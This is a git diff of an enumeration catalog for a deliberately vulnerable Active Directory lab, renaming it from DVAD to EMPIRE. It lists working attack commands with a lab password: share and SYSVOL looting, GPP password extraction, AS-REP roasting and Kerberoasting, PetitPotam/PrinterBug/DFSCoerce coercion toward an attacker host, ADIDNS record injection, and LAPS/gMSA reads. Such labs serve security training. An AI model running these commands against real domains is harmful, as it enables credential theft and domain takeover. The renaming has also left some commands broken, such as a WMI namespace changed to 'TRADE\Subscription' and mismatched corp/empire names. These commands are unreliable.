@@ -1,6 +1,6 @@
 # 02b — Enumeration Catalog (ENUM-001..080)
 
-The most-skipped, most-rewarding phase. If you take only **one** thing from DVAD, take this: *good enumeration is the difference between a 4-hour solve and a 4-day one.* Every flag in `PLAN.md` is reachable by an attacker who enumerates well. This page catalogs every enumeration primitive DVAD exposes, what it returns, what tool to use, and what to grep the output for.
+The most-skipped, most-rewarding phase. If you take only **one** thing from EMPIRE, take this: *good enumeration is the difference between a 4-hour solve and a 4-day one.* Every flag in `PLAN.md` is reachable by an attacker who enumerates well. This page catalogs every enumeration primitive EMPIRE exposes, what it returns, what tool to use, and what to grep the output for.
 
 > **Per-host crib sheets** in [`docs/hosts/`](hosts/) tell you what's reachable on each box; this page is the **catalog of techniques** that apply across hosts.
 
@@ -83,28 +83,28 @@ nxc smb 10.10.0.10 -u 'guest' -p ''        # guest
 rpcclient -U "" -N 10.10.0.10
 ```
 **Looks for:** NETLOGON/SYSVOL, custom shares (`Public`, `Shared`, `Backup`, `Software`), domain SID.
-**DVAD wired:** `RestrictAnonymous=0`, null-session pipes = `netlogon,samr,lsarpc,browser,srvsvc`.
+**EMPIRE wired:** `RestrictAnonymous=0`, null-session pipes = `netlogon,samr,lsarpc,browser,srvsvc`.
 
 ### ENUM-007 — SMB share inventory + ACL
 ```bash
 smbmap -H 10.10.0.10 -u '' -p ''
-smbmap -H 10.10.0.13 -u peter.parker -p 'DVADlab2024!' -R PublicShare
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares
+smbmap -H 10.10.0.13 -u peter.parker -p 'EmpireLab2024!' -R PublicShare
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --shares
 ```
 **Looks for:** `READ, WRITE` on shares you shouldn't write to, `Everyone:FullAccess`.
-**DVAD wired:** `\\file01\PublicShare` Everyone:F.
+**EMPIRE wired:** `\\scarif\PublicShare` Everyone:F.
 
 ### ENUM-008 — SYSVOL / NETLOGON content
 **What it returns:** Group Policy, logon scripts, GPP cpasswords, mapped drives.
 ```bash
-smbclient //10.10.0.10/SYSVOL -U peter.parker%DVADlab2024!
+smbclient //10.10.0.10/SYSVOL -U peter.parker%EmpireLab2024!
 # inside: prompt OFF; recurse ON; mget *
 # Or:
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gpp_password
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gpp_autologin
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M gpp_password
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M gpp_autologin
 ```
 **Looks for:** `Groups.xml` with `cpassword=`, `.bat`/`.ps1` with `net use ... /user:`.
-**DVAD wired:** `Groups.xml` cpassword + `login.bat` cleartext + `map_backup.bat`.
+**EMPIRE wired:** `Groups.xml` cpassword + `login.bat` cleartext + `map_backup.bat`.
 **Forward to:** CRED-029 (GPP decryption).
 
 ### ENUM-009 — RPC pipes via authenticated/null session
@@ -124,11 +124,11 @@ enumdomains
 lookupnames Administrator     # name → SID
 lookupsids S-1-5-21-...-500   # SID → name
 # RID cycling (anon SID enum):
-impacket-lookupsid 'corp.local/'@10.10.0.10
+impacket-lookupsid 'empire.local/'@10.10.0.10
 nxc smb 10.10.0.10 -u '' -p '' --rid-brute 10000
 ```
 **Pipes hit:** `\PIPE\samr` (SAMR — users/groups), `\PIPE\lsarpc` (LSA — SIDs/policy), `\PIPE\srvsvc` (server info), `\PIPE\wkssvc` (workstation/transports), `\PIPE\netlogon` (domain trust).
-**DVAD wired:** all five pipes in NullSessionPipes on dc01.
+**EMPIRE wired:** all five pipes in NullSessionPipes on coruscant.
 
 ### ENUM-010 — RPC endpoint mapper
 **What it returns:** dynamic-port-mapped RPC interfaces and their UUIDs.
@@ -144,9 +144,9 @@ impacket-rpcdump 10.10.0.10
 
 ### ENUM-011 — SMB enumeration with credentials
 ```bash
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' \
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' \
     --users --groups --shares --pass-pol --loggedon-users --sessions --disks --local-groups
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M spider_plus -o READ_ONLY=False
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M spider_plus -o READ_ONLY=False
 ```
 **Looks for:** local admin on what hosts (`(Pwn3d!)` in nxc output), loggedon-users (Kerberoast targets), enabled accounts.
 
@@ -159,7 +159,7 @@ nxc smb 10.10.0.0/21 -M ms17-010
 ### ENUM-013 — Print Spooler reachability (PrinterBug / PrintNightmare gate)
 ```bash
 impacket-rpcdump 10.10.0.10 | grep -i spool
-python3 SpoolSample.py attacker dc01.corp.local
+python3 SpoolSample.py attacker coruscant.empire.local
 nxc smb 10.10.0.0/21 -M printerbug
 nxc smb 10.10.0.0/21 -M spooler
 ```
@@ -167,14 +167,14 @@ nxc smb 10.10.0.0/21 -M spooler
 ### ENUM-014 — EFSRPC reachability (PetitPotam gate)
 ```bash
 impacket-rpcdump 10.10.0.10 | grep -i efsr
-python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker 10.10.0.10
+python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' attacker 10.10.0.10
 nxc smb 10.10.0.0/21 -M petitpotam
 ```
 
 ### ENUM-015 — DFS Namespace coercion gate (DFSCoerce)
 ```bash
 nxc smb 10.10.0.10 -M dfscoerce
-python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local attacker 10.10.0.10
+python3 dfscoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local attacker 10.10.0.10
 ```
 
 ### ENUM-016 — WebClient (WebDAV) reachability (ShadowCoerce / Coerce → HTTP)
@@ -183,7 +183,7 @@ nxc smb 10.10.0.0/21 -M webdav
 # manual:
 curl -X PROPFIND http://10.10.0.10/                   # WebDAV server-side
 ```
-**DVAD wired:** WebClient service auto-started on dc01.
+**EMPIRE wired:** WebClient service auto-started on coruscant.
 
 ---
 
@@ -192,19 +192,19 @@ curl -X PROPFIND http://10.10.0.10/                   # WebDAV server-side
 ### ENUM-017 — LDAP anonymous bind
 ```bash
 ldapsearch -x -H ldap://10.10.0.10 -s base -b "" "(objectclass=*)"        # RootDSE
-ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" "(objectclass=user)" cn
+ldapsearch -x -H ldap://10.10.0.10 -b "DC=empire,DC=local" "(objectclass=user)" cn
 ```
 **Looks for:** `defaultNamingContext`, `domainFunctionality`, `supportedSASLMechanisms`, `dsHeuristics`.
-**DVAD wired:** `LDAPServerIntegrity=1` (no signing required → anon bind tolerated).
+**EMPIRE wired:** `LDAPServerIntegrity=1` (no signing required → anon bind tolerated).
 
 ### ENUM-018 — Authenticated LDAP enumeration
 **Tools:** `ldapsearch`, `windapsearch`, `ldapdomaindump`, `nxc ldap`, `bloodhound-python`, `adidnsdump`.
 ```bash
-ldapdomaindump -u corp\\peter.parker -p 'DVADlab2024!' 10.10.0.10
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
+ldapdomaindump -u corp\\peter.parker -p 'EmpireLab2024!' 10.10.0.10
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' \
     --users --groups --asreproast asrep.txt --kerberoasting kerb.txt \
     --trusted-for-delegation --password-not-required --admin-count --gmsa --bloodhound --collection All
-windapsearch -d corp.local -u peter.parker -p 'DVADlab2024!' --dc-ip 10.10.0.10 -m all
+windapsearch -d empire.local -u peter.parker -p 'EmpireLab2024!' --dc-ip 10.10.0.10 -m all
 ```
 
 ### ENUM-019 — LDAP filters worth memorizing
@@ -216,7 +216,7 @@ windapsearch -d corp.local -u peter.parker -p 'DVADlab2024!' --dc-ip 10.10.0.10 
 (msDS-AllowedToDelegateTo=*)                         # constrained delegation
 (msDS-AllowedToActOnBehalfOfOtherIdentity=*)        # RBCD set
 (adminCount=1)                                       # protected (AdminSDHolder)
-(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)
+(memberOf=CN=Domain Admins,CN=Users,DC=empire,DC=local)
 (objectCategory=computer)                            # all computers
 (operatingSystem=*Server*)
 (servicePrincipalName=MSSQLSvc/*)                    # SQL SPNs
@@ -232,16 +232,16 @@ windapsearch -d corp.local -u peter.parker -p 'DVADlab2024!' --dc-ip 10.10.0.10 
 
 ### ENUM-020 — Trusts + cross-domain principals
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-domains
-ldapsearch -x -H ldap://10.10.0.10 -D 'corp\peter.parker' -w 'DVADlab2024!' \
-    -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)"
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-domains
+ldapsearch -x -H ldap://10.10.0.10 -D 'corp\peter.parker' -w 'EmpireLab2024!' \
+    -b "CN=System,DC=empire,DC=local" "(objectClass=trustedDomain)"
 nltest /domain_trusts /v                       # from Windows
 ```
 **Looks for:** `flatName`, `trustPartner`, `trustDirection`, `trustAttributes` (0x40 = forest-transitive, 0x4 = quarantined, 0x8 = forest-wide auth).
 
 ### ENUM-021 — BloodHound ingest (the big one)
 ```bash
-bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
+bloodhound-python -u peter.parker -p 'EmpireLab2024!' -d empire.local -ns 10.10.0.10 -c all
 # .json into BloodHound CE → "Shortest Paths to Domain Admins"
 # Add custom queries from BadBlood/Improvements repo:
 #  - Find Tier-0 users not in Protected Users
@@ -262,14 +262,14 @@ SOAPHound.exe -c cache.txt --bhdump -o bh-output
 ### ENUM-023 — Global Catalog (3268 / 3269)
 **What it returns:** forest-wide partial attribute index — useful for cross-domain enum from one DC.
 ```bash
-ldapsearch -x -H ldap://10.10.0.10:3268 -D 'corp\peter.parker' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10:3268 -D 'corp\peter.parker' -w 'EmpireLab2024!' \
     -b "" "(&(objectClass=user)(sAMAccountName=*adm*))"
 ```
 
 ### ENUM-024 — LDAP password policy + lockout
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --pass-pol
-ldapsearch ... -b "DC=corp,DC=local" "(objectClass=domain)" \
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --pass-pol
+ldapsearch ... -b "DC=empire,DC=local" "(objectClass=domain)" \
     minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration
 # Fine-grained:
 ldapsearch ... -b "CN=Password Settings Container,CN=System,..." \
@@ -279,7 +279,7 @@ ldapsearch ... -b "CN=Password Settings Container,CN=System,..." \
 ### ENUM-025 — ADIDNS records via LDAP
 **Tools:** `adidnsdump`, raw LDAP.
 ```bash
-adidnsdump -u corp\\peter.parker -p 'DVADlab2024!' 10.10.0.10
+adidnsdump -u corp\\peter.parker -p 'EmpireLab2024!' 10.10.0.10
 # Dump every DNS record in the AD-integrated zone, including ones not in zone transfer.
 ```
 **Forward to:** PER-030 ADIDNS time bomb.
@@ -291,23 +291,23 @@ adidnsdump -u corp\\peter.parker -p 'DVADlab2024!' 10.10.0.10
 ### ENUM-026 — Kerberos username enumeration (no creds)
 **What it returns:** which usernames exist (KDC returns different errors for valid-but-revoked vs unknown).
 ```bash
-kerbrute userenum -d corp.local --dc 10.10.0.10 users.txt
+kerbrute userenum -d empire.local --dc 10.10.0.10 users.txt
 # Also tries common name combos:
-kerbrute userenum -d corp.local --dc 10.10.0.10 \
+kerbrute userenum -d empire.local --dc 10.10.0.10 \
     /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 ```
 
 ### ENUM-027 — AS-REP roastable accounts (no creds)
 ```bash
-impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt -format hashcat
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hashes
+impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt -format hashcat
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --asreproast asrep.hashes
 ```
 **Forward to:** CRED-002 / IA-006.
 
 ### ENUM-028 — Kerberoast SPN enumeration
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kerberoasting kerb.hashes
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 -request
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --kerberoasting kerb.hashes
 ```
 **Forward to:** CRED-001.
 
@@ -321,7 +321,7 @@ ldapsearch ... "(servicePrincipalName=*)" msDS-SupportedEncryptionTypes
 ### ENUM-030 — Delegation enumeration
 ```bash
 # Unconstrained (TRUSTED_FOR_DELEGATION):
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation
 # Constrained (msDS-AllowedToDelegateTo):
 ldapsearch ... "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
 # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set):
@@ -331,19 +331,19 @@ ldapsearch ... "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName
 
 ### ENUM-031 — Kerberos clock skew check (timing matters)
 ```bash
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CORP.LOCAL' 10.10.0.10
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='empire.local' 10.10.0.10
 # If your clock is >5 min off the KDC: every ticket request will fail with KRB_AP_ERR_SKEW.
 sudo ntpdate 10.10.0.10
 ```
 
 ### ENUM-032 — Pre2k / disabled / locked-out / never-logged-on
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --password-not-required
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --password-not-required
 ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=32)"   # PASSWD_NOTREQD
 ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=2)"    # ACCOUNTDISABLE
 ldapsearch ... "(!(lastLogon=*))"                                  # never logged on
 ```
-**DVAD wired:** `PRE2K01$` with PASSWD_NOTREQD and password = `pre2k01` (lowercase sAMAccountName w/o $).
+**EMPIRE wired:** `PRE2K01$` with PASSWD_NOTREQD and password = `pre2k01` (lowercase sAMAccountName w/o $).
 
 ---
 
@@ -351,34 +351,34 @@ ldapsearch ... "(!(lastLogon=*))"                                  # never logge
 
 ### ENUM-033 — Forward / reverse / SRV records
 ```bash
-dig @10.10.0.10 corp.local ANY
-dig @10.10.0.10 -t SRV _ldap._tcp.dc._msdcs.corp.local      # find DCs
-dig @10.10.0.10 -t SRV _kerberos._tcp.corp.local
-dig @10.10.0.10 -t SRV _gc._tcp.corp.local                  # Global Catalogs
+dig @10.10.0.10 empire.local ANY
+dig @10.10.0.10 -t SRV _ldap._tcp.dc._msdcs.empire.local      # find DCs
+dig @10.10.0.10 -t SRV _kerberos._tcp.empire.local
+dig @10.10.0.10 -t SRV _gc._tcp.empire.local                  # Global Catalogs
 dig @10.10.0.10 -x 10.10.0.10                               # PTR
 ```
 
 ### ENUM-034 — AXFR zone transfer
 ```bash
-dig @10.10.0.10 corp.local AXFR
-dig @10.10.0.10 _msdcs.corp.local AXFR
-dig @10.20.0.10 finance.local AXFR
-dig @10.30.0.10 root.corp AXFR
+dig @10.10.0.10 empire.local AXFR
+dig @10.10.0.10 _msdcs.empire.local AXFR
+dig @10.20.0.10 rebel.local AXFR
+dig @10.30.0.10 trade.corp AXFR
 ```
-**DVAD wired:** `Set-DnsServerPrimaryZone -SecureSecondaries TransferAnyServer` on dc01. Finance / root: gap — try anyway.
+**EMPIRE wired:** `Set-DnsServerPrimaryZone -SecureSecondaries TransferAnyServer` on coruscant. Finance / root: gap — try anyway.
 
 ### ENUM-035 — NSEC walking / subdomain brute
 ```bash
-dnsenum --dnsserver 10.10.0.10 corp.local
-gobuster dns -d corp.local -r 10.10.0.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+dnsenum --dnsserver 10.10.0.10 empire.local
+gobuster dns -d empire.local -r 10.10.0.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
 ### ENUM-036 — DNS dynamic-update probe
 ```bash
 nsupdate -d
 > server 10.10.0.10
-> zone corp.local
-> update add evil.corp.local 60 A 10.10.0.99
+> zone empire.local
+> update add evil.empire.local 60 A 10.10.0.99
 > send
 ```
 **Forward to:** mitm6, ADIDNS poisoning.
@@ -402,7 +402,7 @@ sudo responder -I virbr1 -A           # analyze-only mode, doesn't poison
 
 ### ENUM-039 — WPAD probe
 ```bash
-curl -sv http://wpad.corp.local/wpad.dat
+curl -sv http://wpad.empire.local/wpad.dat
 curl -sv http://10.10.0.10/wpad.dat
 ```
 
@@ -424,17 +424,17 @@ nikto -h http://10.10.0.12
 
 ### ENUM-042 — ADCS web enrollment
 ```bash
-curl -sk http://10.10.0.12/certsrv/ -u 'corp\peter.parker:DVADlab2024!'
+curl -sk http://10.10.0.12/certsrv/ -u 'corp\peter.parker:EmpireLab2024!'
 # returns "Microsoft Active Directory Certificate Services"
-nxc smb 10.10.0.12 -u peter.parker -p 'DVADlab2024!' -M adcs
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+nxc smb 10.10.0.12 -u peter.parker -p 'EmpireLab2024!' -M adcs
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
 ```
-**DVAD wired:** /certsrv with Basic + Windows auth, no EPA, HTTP only → **ESC8**.
+**EMPIRE wired:** /certsrv with Basic + Windows auth, no EPA, HTTP only → **ESC8**.
 
 ### ENUM-043 — IIS WebDAV (PROPFIND)
 ```bash
 davtest -url http://10.10.0.12/
-curl -X PROPFIND -H "Depth: 1" http://10.10.0.12/ -u 'corp\peter.parker:DVADlab2024!'
+curl -X PROPFIND -H "Depth: 1" http://10.10.0.12/ -u 'corp\peter.parker:EmpireLab2024!'
 ```
 
 ### ENUM-044 — Web directory brute
@@ -465,9 +465,9 @@ python3 mssql-tcp-info.py 10.10.0.0/21       # broadcast probe
 
 ### ENUM-047 — Authenticated SQL enum
 ```bash
-nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' \
+nxc mssql 10.10.0.14 -u peter.parker -p 'EmpireLab2024!' \
     --local-auth -q "SELECT name FROM sys.databases"
-mssqlclient.py corp/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
+mssqlclient.py corp/peter.parker:'EmpireLab2024!'@10.10.0.14 -windows-auth
 # inside:
 enum_db
 enum_links                          # linked servers (lateral!)
@@ -496,11 +496,11 @@ Invoke-SQLAudit -Verbose
 
 ### ENUM-050 — WinRM reachability
 ```bash
-nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
-evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!'
-curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\peter.parker:DVADlab2024!'
+nxc winrm 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
+evil-winrm -i 10.10.0.10 -u peter.parker -p 'EmpireLab2024!'
+curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\peter.parker:EmpireLab2024!'
 ```
-**DVAD wired:** 5985 HTTP open everywhere with `AllowUnencrypted=true`, Basic + CredSSP.
+**EMPIRE wired:** 5985 HTTP open everywhere with `AllowUnencrypted=true`, Basic + CredSSP.
 
 ---
 
@@ -510,7 +510,7 @@ curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\peter.parker:DVADlab2024!'
 ```bash
 nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.0.0/21
 rdesktop -u peter.parker 10.10.0.100
-xfreerdp /v:10.10.0.100 /u:peter.parker /p:'DVADlab2024!'
+xfreerdp /v:10.10.0.100 /u:peter.parker /p:'EmpireLab2024!'
 ```
 **Looks for:** `NLA: No` → CVE-2019-0708 (BlueKeep) candidate, `CredSSP_Required: false`.
 
@@ -520,22 +520,22 @@ xfreerdp /v:10.10.0.100 /u:peter.parker /p:'DVADlab2024!'
 
 ### ENUM-052 — WMI query (over DCOM 135 → dynamic)
 ```bash
-impacket-wmiexec corp/peter.parker:'DVADlab2024!'@10.10.0.100
+impacket-wmiexec corp/peter.parker:'EmpireLab2024!'@10.10.0.100
 # Or query without exec:
-impacket-wmiquery corp/peter.parker:'DVADlab2024!'@10.10.0.100 \
+impacket-wmiquery corp/peter.parker:'EmpireLab2024!'@10.10.0.100 \
     -namespace 'root/cimv2' 'SELECT * FROM Win32_Process'
 ```
 
 ### ENUM-053 — DCOM application enumeration
 ```powershell
 Get-CimInstance Win32_DCOMApplication
-Get-CimInstance -Namespace ROOT\Subscription -ClassName __EventFilter
+Get-CimInstance -Namespace TRADE\Subscription -ClassName __EventFilter
 ```
 **Looks for:** persistent WMI subscriptions = backdoor.
 
 ---
 
-## L. SNMP (gap on DVAD — IA-018 enable plan)
+## L. SNMP (gap on EMPIRE — IA-018 enable plan)
 
 ### ENUM-054 — SNMP community guess
 ```bash
@@ -551,9 +551,9 @@ snmp-check -c public 10.10.0.10
 
 ### ENUM-055 — All ESC checks at once
 ```bash
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
 # Without auth (if you have certificate name):
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -dc-only
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -enabled -dc-only
 ```
 **Looks for:** `ESC1` … `ESC16`, `Web Enrollment` URL, `User Specified SAN`, `Manager Approval = False`, `Authorized Signatures Required = 0`, `Enrollment Rights`, `Object Control Permissions`.
 
@@ -586,9 +586,9 @@ curl -sk "https://10.10.0.12/corp-CA-CA_CES_UsernamePassword/service.svc/CES"
 
 ### ENUM-059 — All GPOs + linked OUs
 ```bash
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M enum_gpp
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M enum_gpp
 # Or:
-ldapsearch ... -b "CN=Policies,CN=System,DC=corp,DC=local" "(objectClass=groupPolicyContainer)"
+ldapsearch ... -b "CN=Policies,CN=System,DC=empire,DC=local" "(objectClass=groupPolicyContainer)"
 # From Windows:
 Get-GPO -All
 Get-GPOReport -All -ReportType HTML -Path .\gpos.html
@@ -596,7 +596,7 @@ Get-GPOReport -All -ReportType HTML -Path .\gpos.html
 
 ### ENUM-060 — Per-OU GPO inheritance
 ```powershell
-Get-GPInheritance -Target "OU=Workstations,DC=corp,DC=local"
+Get-GPInheritance -Target "OU=Workstations,DC=empire,DC=local"
 gpresult /h gp.html         # local
 gpresult /scope:computer /v
 ```
@@ -632,7 +632,7 @@ whoami /groups
 net user
 net localgroup administrators
 cmdkey /list                          # Credential Manager
-runas /savecred /user:CORP\admin cmd  # use saved creds
+runas /savecred /user:EMPIRE\admin cmd  # use saved creds
 vaultcmd /listcreds:"Windows Credentials" /all
 ```
 
@@ -665,12 +665,12 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
 ```
-**DVAD wired:** Both AIE set on ws01; ConsentPromptBehaviorAdmin=0.
+**EMPIRE wired:** Both AIE set on tatooine; ConsentPromptBehaviorAdmin=0.
 
 ### ENUM-069 — LAPS + gMSA enumeration
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --gmsa
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --gmsa
 # LDAP:
 ldapsearch ... "(ms-Mcs-AdmPwd=*)" cn ms-Mcs-AdmPwd
 ldapsearch ... "(msDS-GroupMSAMembership=*)" sAMAccountName msDS-GroupMSAMembership
@@ -698,14 +698,14 @@ type "C:\Program Files (x86)\McAfee\Common Framework\SiteList.xml"
 Get-ADSyncConnectorRunStatus
 Get-ADSyncScheduler
 # Detect AAD Connect server: ldap (servicePrincipalName=MSOL_*)
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query \
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --query \
     "(samaccountname=MSOL_*)" "sAMAccountName description"
 ```
 
 ### ENUM-072 — Office 365 tenant discovery (from Kali)
 ```bash
-curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=peter.parker@corp.local&xml=1"
-curl -s "https://login.microsoftonline.com/corp.local/.well-known/openid-configuration"
+curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=peter.parker@empire.local&xml=1"
+curl -s "https://login.microsoftonline.com/empire.local/.well-known/openid-configuration"
 ```
 
 ---
@@ -766,16 +766,16 @@ nxc smb $TARGET -u '' -p ''
 nxc smb $TARGET -u 'guest' -p ''
 # 3. RPC pipes
 impacket-rpcdump $TARGET | tee rpcdump.out
-impacket-lookupsid 'corp.local/'@$TARGET 10000 | tee sids.out
+impacket-lookupsid 'empire.local/'@$TARGET 10000 | tee sids.out
 # 4. LDAP anon
 ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectclass=*)" | tee rootdse.out
 # 5. DNS
-dig @$TARGET corp.local AXFR | tee axfr.out
-dig @$TARGET -t SRV _ldap._tcp.dc._msdcs.corp.local
+dig @$TARGET empire.local AXFR | tee axfr.out
+dig @$TARGET -t SRV _ldap._tcp.dc._msdcs.empire.local
 # 6. Kerberos username enum
-kerbrute userenum -d corp.local --dc $TARGET /usr/share/seclists/Usernames/Names/names.txt
+kerbrute userenum -d empire.local --dc $TARGET /usr/share/seclists/Usernames/Names/names.txt
 # 7. AS-REP roast pass (no creds needed)
-impacket-GetNPUsers corp.local/ -dc-ip $TARGET -no-pass -usersfile names.txt -format hashcat
+impacket-GetNPUsers empire.local/ -dc-ip $TARGET -no-pass -usersfile names.txt -format hashcat
 # 8. Web
 nmap -p 80,443,5985,8530,8000,8080 --script http-enum $TARGET
 # 9. SQL Browser
@@ -787,9 +787,9 @@ curl -sk http://10.10.0.12/certsrv/
 If you found a credential along the way (AS-REP crack, SYSVOL cpassword, anon LDAP user attribute leak, sprayed password), pivot immediately into **authenticated** enum:
 
 ```bash
-nxc smb,ldap,mssql,winrm,rdp 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
-bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+nxc smb,ldap,mssql,winrm,rdp 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
+bloodhound-python -u peter.parker -p 'EmpireLab2024!' -d empire.local -ns 10.10.0.10 -c all
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
 ```
 
 ---
@@ -799,19 +799,19 @@ certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vul
 | ID | Technique | Where |
 |---|---|---|
 | ENUM-001..005 | Network / port / IPv6 sweep | Kali |
-| ENUM-006..016 | SMB / RPC null+auth / shares / SYSVOL / coercion gates | dc01 mostly |
+| ENUM-006..016 | SMB / RPC null+auth / shares / SYSVOL / coercion gates | coruscant mostly |
 | ENUM-017..025 | LDAP / ADWS / BloodHound / ADIDNS | any DC |
 | ENUM-026..032 | Kerberos roast / preauth / delegation / pre2k | any DC |
 | ENUM-033..036 | DNS forward+AXFR+dyn-update | any DC |
 | ENUM-037..040 | NetBIOS / LLMNR / mDNS / WSD / WPAD | local L2 |
-| ENUM-041..045 | HTTP / IIS / WebDAV / OWA-SCCM-WSUS endpoints | ca01, others |
-| ENUM-046..049 | MSSQL browser / authed / linked servers | sql01 |
+| ENUM-041..045 | HTTP / IIS / WebDAV / OWA-SCCM-WSUS endpoints | endor, others |
+| ENUM-046..049 | MSSQL browser / authed / linked servers | kamino |
 | ENUM-050 | WinRM | all |
 | ENUM-051 | RDP | all |
 | ENUM-052..053 | WMI / DCOM | local |
 | ENUM-054 | SNMP | (gap, planned) |
-| ENUM-055..058 | ADCS deep enum | ca01 |
-| ENUM-059..061 | GPO / SYSVOL deep | dc01 |
+| ENUM-055..058 | ADCS deep enum | endor |
+| ENUM-059..061 | GPO / SYSVOL deep | coruscant |
 | ENUM-062..070 | Local Windows enum | post-foothold |
 | ENUM-071..072 | Hybrid / Entra | (partial) |
 | ENUM-073..074 | EDR / Defender / AMSI | post-foothold |
@@ -825,15 +825,97 @@ Each VM has its own page listing **exactly** what ports/pipes/shares/SPNs are re
 
 | Host | Page |
 |---|---|
-| `dc01.corp.local` (10.10.0.10) | [`hosts/dc01-corp.md`](hosts/dc01-corp.md) |
